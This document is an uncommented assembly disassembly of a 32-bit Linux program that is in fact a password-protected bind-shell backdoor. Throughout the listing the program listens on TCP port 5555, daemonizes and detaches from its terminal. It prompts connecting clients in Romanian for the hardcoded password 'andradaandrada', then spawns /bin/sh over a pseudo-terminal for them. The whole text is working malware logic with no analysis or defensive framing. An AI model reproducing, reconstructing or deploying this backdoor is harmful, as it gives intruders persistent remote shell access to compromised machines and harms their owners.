xor ebp, ebp
pop esi
mov ecx, esp
and esp, 0xfffffff0
push eax
push esp
push edx
push dbg.__libc_csu_fini
push dbg.__libc_csu_init
push ecx
push esi
push main
call sym.imp.__libc_start_main
jmp dword [reloc.__libc_start_main]
push ebp
mov ebp, esp
push ebx
call 0x8048a0d
pop ebx
add ebx, 0x1def
push edx
mov eax, dword [ebx + 0x98]
test eax, eax
je 0x8048a21
call eax
pop eax
pop ebx
leave
ret
push ebp
mov ebp, esp
push eax
push eax
cmp byte [obj.completed.1], 0
jne 0x8048a6c
mov eax, dword [obj.p.0]
mov edx, dword [eax]
test edx, edx
je 0x8048a65
lea esi, [esi]
add eax, 4
mov dword [obj.p.0], eax
call edx
mov eax, dword [obj.p.0]
mov edx, dword [eax]
test edx, edx
jne 0x8048a50
mov byte [obj.completed.1], 1
leave
ret
push ebp
mov ebp, esp
push ecx
push ecx
mov edx, dword [obj.__JCR_LIST__]
test edx, edx
je 0x8048a98
mov eax, 0
test eax, eax
je 0x8048a98
sub esp, 0xc
push obj.__JCR_LIST__
call loc.imp.__gmon_start__
add esp, 0x10
leave
ret
push ebp
mov ebp, esp
push ebx
push edx
mov ebx, obj.__CTOR_LIST__
mov eax, dword [obj.__CTOR_LIST__]
cmp eax, 0xffffffff
je 0x8049610
sub ebx, 4
call eax
mov eax, dword [ebx]
cmp eax, 0xffffffff
jne 0x8049604
pop eax
pop ebx
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 8
sub esp, 8
push 1
push 0
call sym.imp.kill
add esp, 0x10
sub esp, 8
push 0xf
push 0
call sym.imp.kill
add esp, 0x10
leave
ret
jmp dword [reloc.kill]
push ebp
mov ebp, esp
sub esp, 8
sub esp, 8
push sym.sig_child
push 0x11
call sym.imp.signal
add esp, 0x10
sub esp, 4
push 1
push 0
push 0xffffffffffffffff
call sym.imp.waitpid
add esp, 0x10
leave
ret
jmp dword [reloc.signal]
jmp dword [reloc.waitpid]
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_ch], ebx
call sym.__i686.get_pc_thunk.bx
add ebx, 0x126e
mov dword [var_4h], edi
lea eax, [ebx - 0xec]
lea edi, [ebx - 0xec]
mov dword [var_8h], esi
sub eax, edi
sar eax, 2
test eax, eax
lea esi, [eax - 1]
jne 0x80495c4
call sym._fini
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
mov esp, ebp
pop ebp
ret
call dword [edi + esi*4]
mov eax, esi
dec esi
test eax, eax
jne 0x80495c4
call sym._fini
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
mov esp, ebp
pop ebp
ret
mov ebx, dword [esp]
ret
push ebp
mov ebp, esp
push ebx
call 0x804961d
pop ebx
add ebx, 0x11df
push eax
call sym.__do_global_dtors_aux
pop ecx
pop ebx
leave
ret
push ebp
mov ebp, esp
sub esp, 8
call sym.call_gmon_start
call sym.frame_dummy
call sym.__do_global_ctors_aux
leave
ret
push ebp
mov ebp, esp
sub esp, 0x218
sub esp, 8
push 2
push str._dev_ptmx
call sym.imp.open
add esp, 0x10
mov dword [fildes], eax
sub esp, 0xc
push dword [fildes]
call sym.imp.close
add esp, 0x10
mov dword [var_20ch], 0
cmp dword [var_20ch], 0xff
jle 0x8048b9b
jmp 0x8048c48
sub esp, 4
lea eax, [path]
push eax
push str._dev_pty
push dword [var_20ch]
call sym.get_tty
add esp, 0x10
sub esp, 8
push 2
lea eax, [path]
push eax
call sym.imp.open
add esp, 0x10
mov edx, eax
mov eax, dword [arg_ch]
mov dword [eax], edx
mov eax, dword [arg_ch]
cmp dword [eax], 0
jns 0x8048bdd
jmp 0x8048c3b
sub esp, 4
lea eax, [path]
push eax
push str._dev_tty
push dword [var_20ch]
call sym.get_tty
add esp, 0x10
sub esp, 8
push 2
lea eax, [path]
push eax
call sym.imp.open
add esp, 0x10
mov edx, eax
mov eax, dword [arg_8h]
mov dword [eax], edx
mov eax, dword [arg_8h]
cmp dword [eax], 0
jns 0x8048c2f
sub esp, 0xc
mov eax, dword [arg_ch]
push dword [eax]
call sym.imp.close
add esp, 0x10
jmp 0x8048c3b
mov dword [var_214h], 1
jmp 0x8048c52
lea eax, [var_20ch]
inc dword [eax]
jmp 0x8048b8a
mov dword [var_214h], 0
mov eax, dword [var_214h]
leave
ret
jmp dword [reloc.open]
jmp dword [reloc.close]
push ebp
mov ebp, esp
sub esp, 0x58
mov eax, dword [str.pqrstuvwxyzabcde]
mov dword [var_28h], eax
mov eax, dword [0x804963c]
mov dword [var_24h], eax
mov eax, dword [0x8049640]
mov dword [var_20h], eax
mov eax, dword [0x8049644]
mov dword [var_1ch], eax
mov al, byte [0x8049648]
mov byte [var_18h], al
mov eax, dword [str.0123456789abcdef]
mov dword [var_48h], eax
mov eax, dword [0x804964d]
mov dword [var_44h], eax
mov eax, dword [0x8049651]
mov dword [var_40h], eax
mov eax, dword [0x8049655]
mov dword [var_3ch], eax
mov al, byte [0x8049659]
mov byte [var_38h], al
sub esp, 0xc
push dword [src]
call sym.imp.strlen
add esp, 0x10
mov dword [var_4ch], eax
sub esp, 8
push dword [src]
push dword [dest]
call sym.imp.strcpy
add esp, 0x10
mov eax, dword [var_4ch]
mov edx, dword [dest]
add edx, eax
mov eax, dword [arg_8h]
sar eax, 4
and eax, 0xf
mov al, byte [eax + ebp - 0x28]
mov byte [edx], al
mov eax, dword [var_4ch]
add eax, dword [dest]
lea edx, [eax + 1]
mov eax, dword [arg_8h]
and eax, 0xf
mov al, byte [eax + ebp - 0x48]
mov byte [edx], al
mov eax, dword [var_4ch]
add eax, dword [dest]
add eax, 2
mov byte [eax], 0
leave
ret
jmp dword [reloc.strlen]
jmp dword [reloc.strcpy]
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_ch], ebx
mov dword [var_8h], esi
xor esi, esi
call sym.__i686.get_pc_thunk.bx
add ebx, 0x12c9
mov dword [var_4h], edi
call sym._init
lea edx, [ebx - 0xec]
lea eax, [ebx - 0xec]
sub edx, eax
sar edx, 2
cmp esi, edx
jae 0x804956b
mov dword [var_10h], eax
mov edi, edx
nop
lea esi, [esi]
call dword [eax + esi*4]
inc esi
mov eax, dword [var_10h]
cmp esi, edi
jb 0x8049560
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
push edi
sub esp, 0x18864
and esp, 0xfffffff0
mov eax, 0
sub esp, eax
sub esp, 4
push 6
push 1
push 2
call sym.imp.socket
add esp, 0x10
mov dword [socket], eax
cmp dword [socket], 0
jns 0x8048cf8
sub esp, 0xc
push str.socket
call sym.imp.perror
add esp, 0x10
mov dword [ebp - 0x1885c], 1
jmp 0x8049507
sub esp, 8
push 0x10
lea eax, [address]
push eax
call sym.imp.bzero
add esp, 0x10
mov word [address], 2
sub esp, 0xc
push 0
call sym.imp.htonl
add esp, 0x10
mov dword [var_24h], eax
sub esp, 0xc
push 0x15b3
call sym.imp.htons
add esp, 0x10
mov word [var_26h], ax
sub esp, 4
push 0x10
lea eax, [address]
push eax
push dword [socket]
call sym.imp.bind
add esp, 0x10
test eax, eax
jns 0x8048d6a
sub esp, 0xc
push str.bind
call sym.imp.perror
add esp, 0x10
mov dword [ebp - 0x1885c], 1
jmp 0x8049507
sub esp, 8
push 5
push dword [socket]
call sym.imp.listen
add esp, 0x10
test eax, eax
jns 0x8048d9d
sub esp, 0xc
push str.listen
call sym.imp.perror
add esp, 0x10
mov dword [ebp - 0x1885c], 1
jmp 0x8049507
sub esp, 0xc
push str.Daemon_is_starting...
call sym.imp.printf
add esp, 0x10
sub esp, 0xc
push dword [obj.stdout]
call sym.imp.fflush
add esp, 0x10
call sym.imp.fork
mov dword [fildes], eax
cmp dword [fildes], 0
je 0x8048dee
sub esp, 8
push dword [fildes]
push str.OK__pid___d_n
call sym.imp.printf
add esp, 0x10
mov dword [ebp - 0x1885c], 0
jmp 0x8049507
call sym.imp.setsid
sub esp, 0xc
push 0x80496ad
call sym.imp.chdir
add esp, 0x10
sub esp, 8
push 2
push str._dev_null
call sym.imp.open
add esp, 0x10
mov dword [fildes], eax
sub esp, 8
push 0
push dword [fildes]
call sym.imp.dup2
add esp, 0x10
sub esp, 8
push 1
push dword [fildes]
call sym.imp.dup2
add esp, 0x10
sub esp, 8
push 2
push dword [fildes]
call sym.imp.dup2
add esp, 0x10
sub esp, 0xc
push dword [fildes]
call sym.imp.close
add esp, 0x10
sub esp, 8
push 1
push 1
call sym.imp.signal
add esp, 0x10
sub esp, 8
push sym.sig_child
push 0x11
call sym.imp.signal
add esp, 0x10
mov dword [var_44h], 0x10
sub esp, 4
lea eax, [var_44h]
push eax
lea eax, [var_38h]
push eax
push dword [socket]
call sym.imp.accept
add esp, 0x10
mov dword [fd], eax
cmp dword [fd], 0
jns 0x8048e9f
jmp 0x8048e77
call sym.imp.fork
mov dword [fildes], eax
cmp dword [fildes], 0
jne 0x80494f4
mov dword [ebp - 0x80e8], 0x80496b9
mov dword [ebp - 0x80e4], 0x80496bc
mov dword [ebp - 0x80e0], 0
lea eax, [ebp - 0x187f8]
mov dword [ebp - 0x84e8], eax
sub esp, 4
push 0x80496ad
push str.HOME_s
lea eax, [ebp - 0x187f8]
push eax
call sym.imp.sprintf
add esp, 0x10
mov dword [ebp - 0x186ec], 0
sub esp, 4
push 0x100
lea edx, [ebp - 0x186e8]
mov eax, dword [ebp - 0x186ec]
shl eax, 8
lea eax, [eax + edx]
push eax
push dword [fd]
call sym.imp.read
add esp, 0x10
mov dword [ebp - 0x186f0], eax
mov ecx, dword [ebp - 0x186ec]
lea edx, [ebp - 0x186e8]
mov eax, dword [ebp - 0x186ec]
shl eax, 8
lea eax, [eax + edx]
mov dword [ebp + ecx*4 - 0x84e4], eax
lea eax, [ebp - 0x186ec]
inc dword [eax]
cmp dword [ebp - 0x186ec], 0xff
jg 0x8048f88
cmp dword [ebp - 0x186f0], 0xff
jle 0x8048f88
mov eax, dword [ebp - 0x186ec]
shl eax, 8
lea edx, [var_8h]
add eax, edx
sub eax, 0x187e0
cmp byte [eax], 0xa
jne 0x8048f01
mov eax, dword [ebp - 0x186ec]
mov dword [ebp + eax*4 - 0x84e4], 0
sub esp, 8
push 0
push 0
call sym.imp.setpgid
add esp, 0x10
sub esp, 8
lea eax, [var_50h]
push eax
lea eax, [var_4ch]
push eax
call sym.open_tty
add esp, 0x10
test eax, eax
jne 0x8049047
mov eax, dword [str.Cant_fork_pty__bye__n]
mov dword [ebp - 0x18818], eax
mov eax, dword [0x80496cb]
mov dword [ebp - 0x18814], eax
mov eax, dword [0x80496cf]
mov dword [ebp - 0x18810], eax
mov eax, dword [0x80496d3]
mov dword [ebp - 0x1880c], eax
mov eax, dword [0x80496d7]
mov dword [ebp - 0x18808], eax
mov ax, word [0x80496db]
mov word [ebp - 0x18804], ax
sub esp, 4
lea eax, [ebp - 0x18818]
sub esp, 8
push eax
call sym.imp.strlen
add esp, 0xc
push eax
lea eax, [ebp - 0x18818]
push eax
push dword [fd]
call sym.imp.write
add esp, 0x10
sub esp, 0xc
push dword [fd]
call sym.imp.close
add esp, 0x10
sub esp, 0xc
push 0
call sym.imp.exit
call sym.imp.fork
mov dword [pid], eax
cmp dword [pid], 0
jne 0x8049157
sub esp, 0xc
push dword [var_50h]
call sym.imp.close
add esp, 0x10
call sym.imp.setsid
sub esp, 8
push 0x540e
push dword [var_4ch]
call sym.imp.ioctl
add esp, 0x10
sub esp, 0xc
push dword [fd]
call sym.imp.close
add esp, 0x10
sub esp, 0xc
push dword [socket]
call sym.imp.close
add esp, 0x10
sub esp, 8
push 0
push 1
call sym.imp.signal
add esp, 0x10
sub esp, 8
push 0
push 0x11
call sym.imp.signal
add esp, 0x10
sub esp, 8
push 0
push dword [var_4ch]
call sym.imp.dup2
add esp, 0x10
sub esp, 8
push 1
push dword [var_4ch]
call sym.imp.dup2
add esp, 0x10
sub esp, 8
push 2
push dword [var_4ch]
call sym.imp.dup2
add esp, 0x10
sub esp, 0xc
push dword [var_4ch]
call sym.imp.close
add esp, 0x10
sub esp, 0xc
push str.Baga_parola_cutzulake:
call sym.imp.printf
add esp, 0x10
sub esp, 8
lea eax, [ebp - 0x18828]
push eax
push 0x80496f4
call sym.imp.scanf
add esp, 0x10
lea eax, [ebp - 0x18828]
sub esp, 8
push str.andradaandrada
push eax
call sym.imp.strcmp
add esp, 0x10
test eax, eax
jne 0x80490f7
sub esp, 4
lea eax, [ebp - 0x84e8]
push eax
lea eax, [ebp - 0x80e8]
push eax
push str._bin_sh
call sym.imp.execve
add esp, 0x10
sub esp, 0xc
push dword [var_4ch]
call sym.imp.close
add esp, 0x10
sub esp, 8
push sym.hangout
push 1
call sym.imp.signal
add esp, 0x10
sub esp, 8
push sym.hangout
push 0xf
call sym.imp.signal
add esp, 0x10
mov eax, 0
mov ecx, 0x20
lea edi, [var_d8h]
cld
rep stosd dword es:[edi], eax
mov eax, ecx
mov dword [ebp - 0x1882c], eax
mov eax, edi
mov dword [ebp - 0x18830], eax
mov eax, dword [var_50h]
mov edx, eax
shr edx, 5
mov eax, dword [var_50h]
and eax, 0x1f
bts dword [ebp + edx*4 - 0xd8], eax
mov eax, dword [fd]
mov edx, eax
shr edx, 5
mov eax, dword [fd]
and eax, 0x1f
bts dword [ebp + edx*4 - 0xd8], eax
sub esp, 0xc
push 0
push 0
push 0
lea eax, [var_d8h]
push eax
mov eax, dword [var_50h]
cmp eax, dword [fd]
jle 0x80491fc
mov eax, dword [var_50h]
inc eax
mov dword [ebp - 0x18860], eax
jmp 0x8049206
mov eax, dword [fd]
inc eax
mov dword [ebp - 0x18860], eax
push dword [ebp - 0x18860]
call sym.imp.select
add esp, 0x20
test eax, eax
jns 0x804921d
jmp 0x80494a9
mov eax, dword [var_50h]
mov edx, eax
and edx, 0x1f
mov eax, dword [var_50h]
shr eax, 5
bt dword [ebp + eax*4 - 0xd8], edx
setb al
test al, al
je 0x804928c
sub esp, 4
push 0x8000
lea eax, [ebp - 0x80d8]
push eax
push dword [var_50h]
call sym.imp.read
add esp, 0x10
mov dword [ebp - 0x18830], eax
cmp dword [ebp - 0x18830], 0
jg 0x8049268
jmp 0x80494a9
sub esp, 4
push dword [ebp - 0x18830]
lea eax, [ebp - 0x80d8]
push eax
push dword [fd]
call sym.imp.write
add esp, 0x10
test eax, eax
jg 0x804928c
jmp 0x80494a9
mov eax, dword [fd]
mov edx, eax
and edx, 0x1f
mov eax, dword [fd]
shr eax, 5
bt dword [ebp + eax*4 - 0xd8], edx
setb al
test al, al
je 0x8049189
lea eax, [ebp - 0x80d8]
mov dword [ebp - 0x18834], eax
sub esp, 4
push 0x8000
lea eax, [ebp - 0x80d8]
push eax
push dword [fd]
call sym.imp.read
add esp, 0x10
mov dword [ebp - 0x18830], eax
cmp dword [ebp - 0x18830], 0
jg 0x80492e7
jmp 0x80494a9
lea eax, [ebp - 0x80d8]
sub esp, 4
push dword [ebp - 0x18830]
push 0x1d
push eax
call sym.imp.memchr
add esp, 0x10
mov dword [ebp - 0x1882c], eax
cmp dword [ebp - 0x1882c], 0
je 0x8049487
lea edx, [ebp - 0x80d8]
mov eax, dword [ebp - 0x1882c]
sub eax, edx
mov edx, eax
mov eax, dword [ebp - 0x18830]
sub eax, edx
mov dword [ebp - 0x1884c], eax
cmp dword [ebp - 0x1884c], 5
jle 0x8049345
mov dword [ebp - 0x1884c], 5
sub esp, 4
push dword [ebp - 0x1884c]
push dword [ebp - 0x1882c]
lea eax, [ebp - 0x18848]
push eax
call sym.imp.memcpy
add esp, 0x10
cmp dword [ebp - 0x1884c], 4
jg 0x8049393
sub esp, 4
mov eax, 5
sub eax, dword [ebp - 0x1884c]
push eax
lea eax, [ebp - 0x18848]
add eax, dword [ebp - 0x1884c]
push eax
push dword [fd]
call sym.imp.read
add esp, 0x10
mov word [ebp - 0x18852], 0
mov word [ebp - 0x18854], 0
mov eax, 0
mov al, byte [ebp - 0x18847]
mov edx, eax
shl edx, 8
mov eax, 0
mov al, byte [ebp - 0x18846]
lea eax, [eax + edx]
mov word [ebp - 0x18856], ax
mov eax, 0
mov al, byte [ebp - 0x18845]
mov edx, eax
shl edx, 8
mov eax, 0
mov al, byte [ebp - 0x18844]
lea eax, [eax + edx]
mov word [ebp - 0x18858], ax
sub esp, 4
lea eax, [ebp - 0x18858]
push eax
push 0x5414
push dword [var_50h]
call sym.imp.ioctl
add esp, 0x10
sub esp, 8
push 0x1c
push 0
call sym.imp.kill
add esp, 0x10
sub esp, 4
lea edx, [ebp - 0x80d8]
mov eax, dword [ebp - 0x1882c]
sub eax, edx
push eax
lea eax, [ebp - 0x80d8]
push eax
push dword [var_50h]
call sym.imp.write
add esp, 0x10
lea eax, [ebp - 0x80d8]
add eax, dword [ebp - 0x18830]
sub eax, dword [ebp - 0x1882c]
sub eax, 5
mov dword [ebp - 0x1884c], eax
cmp dword [ebp - 0x1884c], 0
jle 0x8049189
sub esp, 4
push dword [ebp - 0x1884c]
mov eax, dword [ebp - 0x1882c]
add eax, 5
push eax
push dword [var_50h]
call sym.imp.write
add esp, 0x10
jmp 0x8049189
sub esp, 4
push dword [ebp - 0x18830]
push dword [ebp - 0x18834]
push dword [var_50h]
call sym.imp.write
add esp, 0x10
test eax, eax
jg 0x8049189
sub esp, 0xc
push dword [fd]
call sym.imp.close
add esp, 0x10
sub esp, 0xc
push dword [socket]
call sym.imp.close
add esp, 0x10
sub esp, 0xc
push dword [var_50h]
call sym.imp.close
add esp, 0x10
sub esp, 4
push 0
push 0
push dword [pid]
call sym.imp.waitpid
add esp, 0x10
call sym.imp.vhangup
sub esp, 0xc
push 0
call sym.imp.exit
sub esp, 0xc
push dword [fd]
call sym.imp.close
add esp, 0x10
jmp 0x8048e77
mov eax, dword [ebp - 0x1885c]
mov edi, dword [var_4h]
leave
ret
jmp dword [reloc.write]
jmp dword [reloc.strcmp]
jmp dword [reloc.perror]
jmp dword [reloc.fork]
jmp dword [reloc.fflush]
jmp dword [reloc.select]
jmp dword [reloc.htonl]
jmp dword [reloc.execve]
jmp dword [reloc.memchr]
jmp dword [reloc.accept]
jmp dword [reloc.listen]
jmp dword [reloc.setsid]
jmp dword [reloc.vhangup]
jmp dword [reloc.scanf]
jmp dword [reloc.chdir]
jmp dword [reloc.setpgid]
jmp dword [reloc.dup2]
jmp dword [reloc.printf]
jmp dword [reloc.bind]
jmp dword [reloc.memcpy]
jmp dword [reloc.bzero]
jmp dword [reloc.exit]
jmp dword [reloc.ioctl]
jmp dword [reloc.htons]
jmp dword [reloc.sprintf]
jmp dword [reloc.socket]
jmp dword [reloc.read]
